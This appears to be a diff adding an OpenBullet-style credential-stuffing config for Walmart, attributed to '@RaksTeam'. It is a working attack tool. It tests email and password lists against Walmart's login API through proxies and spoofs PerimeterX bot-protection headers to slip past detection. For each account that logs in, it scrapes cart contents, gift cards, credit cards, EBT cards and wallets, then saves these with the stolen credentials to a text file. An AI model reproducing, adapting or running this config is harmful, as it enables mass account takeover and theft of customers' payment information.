@@ -1,0 +1,145 @@
+[SETTINGS]
+{
+  "Name": "Walmart",
+  "SuggestedBots": 20,
+  "MaxCPM": 0,
+  "LastModified": "2020-11-05T12:15:19.2358827-08:00",
+  "AdditionalInfo": "@RaksTeam | With Xreactor.Org",
+  "Author": "@RaksTeam",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "@Saeedy207",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#Get_tk REQUEST POST "https://www.walmart.com/api/v3/cart/b1b32f29-0ff4-4392-940e-1ce54a86c233" 
+  CONTENT "{\"currencyCode\":\"USD\",\"location\":{\"postalCode\":\"94066\",\"state\":\"CA\",\"country\":\"USA\",\"isZipLocated\":true},\"storeIds\":[90527,90483,90595,91326,90602]}" 
+  CONTENTTYPE "application/json; charset=utf-8" 
+  HEADER "User-Agent: Android v20.41.3" 
+  HEADER "did: 3b940e72-57ab-473a-9652-36ae7fa745eb" 
+  HEADER "X-PX-AUTHORIZATION: 2" 
+  HEADER "Content-Length: 148" 
+  HEADER "Host: www.walmart.com" 
+  HEADER "Connection: close" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+
+#TK PARSE "<HEADERS(WM_SEC.AUTH_TOKEN)>" LR "" "" -> VAR "TK" 
+
+#LEN FUNCTION Length "{\"email\":\"<USER>\",\"password\":\"<PASS>\"}" -> VAR "LEN" 
+
+#LOG REQUEST POST "https://www.walmart.com/account/electrode/api/identity/password" 
+  CONTENT "{\"email\":\"<USER>\",\"password\":\"<PASS>\"}" 
+  CONTENTTYPE "text/plain;charset=UTF-8" 
+  HEADER "x-wm-auth: <TK>" 
+  HEADER "x-wm-cid: null" 
+  HEADER "x-wm-spid: null" 
+  HEADER "x-wm-xpa: null" 
+  HEADER "User-Agent: Android v20.41.3" 
+  HEADER "did: 3b940e72-57ab-473a-9652-36ae7fa745eb" 
+  HEADER "X-PX-AUTHORIZATION: 3" 
+  HEADER "Content-Length: <LEN>" 
+  HEADER "Host: www.walmart.com" 
+  HEADER "Connection: close" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "{\"emailAddress\":\"" 
+    KEY "customerType" 
+  KEYCHAIN Failure OR 
+    KEY "user_auth_fail" 
+    KEY "Your password and email do not match. Try again or reset your password." 
+
+#Customer_Type PARSE "<SOURCE>" JSON "customerType" CreateEmpty=FALSE -> CAP "Customer Type" 
+
+#has_Associate_Discount_Card? PARSE "<SOURCE>" JSON "hasAssociateDiscountCard" CreateEmpty=FALSE -> CAP "has Associate Discount Card?" 
+
+#GET_1 REQUEST GET "https://api.mobile.walmart.com/v1/cart/items" 
+  
+  HEADER "User-Agent: Android v20.41.3" 
+  HEADER "did: 3b940e72-57ab-473a-9652-36ae7fa745eb" 
+  HEADER "X-PX-ORIGINAL-TOKEN: 3:7acf096e9b179d336beea75f4820a40aae5fba696612768294f3948ff4adf899:8/02xejVy/NeIcZbIU2v0smVRPlBwkEUQXxt2yTX7/a44M1WrZdjh1cdiyWfCqysF+mtIPy7MBCI+o1LhegQ2A==:1000:J3YL+PjvIqwbpOcflihq437/Wvfhe830mlDZfkZq85LpKdVEAou2ry4SgBce+6cvdMOJugML/JXciYosta+Rpyi5mxj05hRvsbuu6kgvpetRv/oUQYtbiOhFE+d254a0lUxEt4LpfINHotMb3GF+zAZCL/sVJAxpV5DpjP5/4B4=" 
+  HEADER "X-PX-AUTHORIZATION: 4" 
+  HEADER "X-PX-BYPASS-REASON: Error checking sdk enabled - general failure" 
+  HEADER "Host: api.mobile.walmart.com" 
+  HEADER "Connection: close" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+
+#Account_Type PARSE "<SOURCE>" JSON "type" CreateEmpty=FALSE -> CAP "Account Type" 
+
+#Items_Count PARSE "<SOURCE>" JSON "itemCount" CreateEmpty=FALSE -> CAP "Items Count" 
+
+#Items PARSE "<SOURCE>" JSON "items" CreateEmpty=FALSE -> CAP "Items" 
+
+#GET_TK REQUEST GET "https://www.walmart.com/account/electrode/account/api/get-notification-preferences" 
+  
+  HEADER "User-Agent: Android v20.41.3" 
+  HEADER "did: 3b940e72-57ab-473a-9652-36ae7fa745eb" 
+  HEADER "X-PX-ORIGINAL-TOKEN: 3:7acf096e9b179d336beea75f4820a40aae5fba696612768294f3948ff4adf899:8/02xejVy/NeIcZbIU2v0smVRPlBwkEUQXxt2yTX7/a44M1WrZdjh1cdiyWfCqysF+mtIPy7MBCI+o1LhegQ2A==:1000:J3YL+PjvIqwbpOcflihq437/Wvfhe830mlDZfkZq85LpKdVEAou2ry4SgBce+6cvdMOJugML/JXciYosta+Rpyi5mxj05hRvsbuu6kgvpetRv/oUQYtbiOhFE+d254a0lUxEt4LpfINHotMb3GF+zAZCL/sVJAxpV5DpjP5/4B4=" 
+  HEADER "X-PX-AUTHORIZATION: 4" 
+  HEADER "X-PX-BYPASS-REASON: Error checking sdk enabled - general failure" 
+  HEADER "Host: www.walmart.com" 
+  HEADER "Connection: close" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+
+#TK PARSE "<COOKIES(x-csrf-jwt)>" LR "" "" -> VAR "TK" 
+
+#GET REQUEST GET "https://www.walmart.com/account/electrode/account/api/customer/%3ACID/payment-method?wallets=true" 
+  
+  HEADER "x-csrf-jwt: <TK>" 
+  HEADER "User-Agent: Android v20.41.3" 
+  HEADER "did: 3b940e72-57ab-473a-9652-36ae7fa745eb" 
+  HEADER "X-PX-AUTHORIZATION: 3" 
+  HEADER "X-PX-ORIGINAL-TOKEN: 3:7acf096e9b179d336beea75f4820a40aae5fba696612768294f3948ff4adf899:8/02xejVy/NeIcZbIU2v0smVRPlBwkEUQXxt2yTX7/a44M1WrZdjh1cdiyWfCqysF+mtIPy7MBCI+o1LhegQ2A==:1000:J3YL+PjvIqwbpOcflihq437/Wvfhe830mlDZfkZq85LpKdVEAou2ry4SgBce+6cvdMOJugML/JXciYosta+Rpyi5mxj05hRvsbuu6kgvpetRv/oUQYtbiOhFE+d254a0lUxEt4LpfINHotMb3GF+zAZCL/sVJAxpV5DpjP5/4B4=" 
+  HEADER "Host: www.walmart.com" 
+  HEADER "Connection: close" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+
+#Gift_Cards PARSE "<SOURCE>" JSON "giftCards" CreateEmpty=FALSE -> CAP "Gift Cards" 
+
+#Credit_Cards PARSE "<SOURCE>" JSON "creditCards" CreateEmpty=FALSE -> CAP "Credit Cards" 
+
+#EBT_Cards PARSE "<SOURCE>" JSON "ebtCards" CreateEmpty=FALSE -> CAP "EBT Cards" 
+
+#Wallets PARSE "<SOURCE>" JSON "wallets" CreateEmpty=FALSE -> CAP "Wallets" 
+
+#SAVE UTILITY File "Walmart.txt" AppendLines "««««««♤[Account]♤»»»»»»\\r\\nCombo:<USER>:<PASS>\\r\\nMail:<USER>\\r\\nPassword:<PASS>\\r\\n««««««♤[Information]♤»»»»»»\\r\\nCustomer Type:<Customer Type>\\r\\nhas Associate Discount Card?:<has Associate Discount Card?>\\r\\nAccount Type:<Account Type>\\r\\nItems Count:<Items Count>\\r\\nItems:<Items>\\r\\nGift Cards:<Gift Cards>\\r\\nCredit Cards:<Credit Cards>\\r\\nEBT Cards:<EBT Cards>\\r\\nWallets:<Wallets>\\r\\n««««««♤[End(Raks)]♤»»»»»»\\r\\n@RaksTeam\\r\\n" -> VAR "SAVING" 
+
